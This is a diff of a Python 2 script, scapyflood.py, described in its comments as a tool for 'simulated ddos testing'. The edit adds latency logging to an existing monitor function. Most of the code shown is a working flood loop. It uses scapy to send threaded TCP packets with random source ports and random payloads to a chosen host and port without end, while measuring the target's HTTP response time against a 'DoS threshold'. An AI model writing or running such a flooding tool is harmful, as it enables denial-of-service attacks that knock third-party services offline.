@@ -1,7 +1,5 @@
 #!/usr/bin/env python
 
-
-
 #scapyflood.py, a tool to do simulated ddos testing with scapy
 #randomizes source port and ip address
 
@@ -21,7 +19,6 @@ try:
 	import math
 	import threading
 	import os
-	import sched
 except ImportError as e:
 	raise ImportError('Error importing!')
 	print e
@@ -34,41 +31,52 @@ class Flood():
 
 
 	def monitor(self, dstUrl, dstIp):
-		s = sched.scheduler(time.time, time.sleep)
 
-		#queue timer
-		startTime=time.time()
-		#run a check every x seconds
 		try:
-		#uses http://docs.python-requests.org/en/master/api/
-			response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
-		except requests.exceptions.RequestException as e:
-			print e
-			sys.exit(1)
-		#measure ET
+			latencyLogFile=open('./latency.log','w')
+			
+		except:
+			print '[-] Error opening file, skipping. '
 
-		elapsedTime = str(round((time.time()-startTime)*1000.0))
-		#tell the user
-		print 'Target web server '+ str(dstIp)+' responded with HTTP ' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'
+		while 1:
+			#monitor timer start
+			startTime=time.time()
+			
+			#run a latency check
+			try:
+			#uses http://docs.python-requests.org/en/master/api/
+				response = requests.get(dstUrl) #basic auth needs a header Authorization: Basic 
+			except requests.exceptions.RequestException as e:
+				print e
+				sys.exit(1)
+			
+			#measure ET
+			elapsedTime = str(round((time.time()-startTime)*1000.0))
 
-		return elapsedTime
+			#tell the user
+			print 'Target web server '+ str(dstIp)+' responded with HTTP ' +str(response.status_code)+' in '+"{:<1}".format(str(elapsedTime)) +'ms'
+			try:
+				latencyLogFile.writelines(elapsedTime)
+			except:
+				print 'couldnt log latency'
+
+			return elapsedTime
+			time.sleep(5)
 
 	def attack(self, args, dstUrl, dstIp, dstPort, multiplier, threads, payloadLen, elapsedTime):
 		#attack loop
 		while 1:
+
+			#init values
 			srcIp=''
 			srcPort=''
 
-
-			#randomize payload length under provided threshold between 1 to payloadlength
+			#init payload length values between 1 and provided arg
 			l=1
 			e=int(payloadLen)
 
-
-			#tell user what's happening
+			#tell user what's happening, if they want
 			if args.verbose is True:print '[!] Attacking %s on port %s from %s using source port %s' % (dstIp, dstPort, srcIp, srcPort)
-
-
 
 			#threaded jobs list
 			jobs = []
@@ -82,28 +90,33 @@ class Flood():
 				#set random source port
 				srcPort = ''.join('%s'%random.randint(1,65535))
 
-				#randomize payload length
-
+				#randomize payload length between 1 and l arg value
 				randPayloadLen = random.randint(l,e)
 
 				#randomize payload chars given the randomized length
 				payload = ''.join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM') for r in range(int(randPayloadLen)))
+				
+				#thread the send. is this even necessary or if it can be used, placed somewhere else?
 				thread = threading.Thread(target=send(IP(src=srcIp, dst=dstIp) / TCP(sport=int(srcPort), dport=int(dstPort)) / payload, count=int(multiplier), verbose=args.verbose))
-				print thread
 
+				#more stuff for user if they want
 				if args.verbose is True: print 'sending packet as %s:%s to %s:%s with payload %s'%(srcIp,srcPort,dstIp,dstPort,payload)
+				
+				#append the threads
 				jobs.append(thread)
 				
+			#start job	
 			for j in jobs:
 				j.start()
 
+			#when done join jobs
 			for j in jobs:
 				j.join()
 
 				
 			#logic to check threshold
 			if float(elapsedTime) <= float(''.join(args.threshold)):
-				print 'under DoS threshold'
+				print elapsedTime+'ms under DoS threshold'
 			else:
 				float(elapsedTime) > float(''.join(args.threshold))
 				print 'over DoS threshold'
@@ -115,8 +128,8 @@ class Flood():
 				#sleep the loop for the delay value divided by 1000 to get milliseconds
 				time.sleep(delay/1000)
 
-
-			self.cls()
+			#keep screen clean
+			#self.cls()
 
 def main():
 
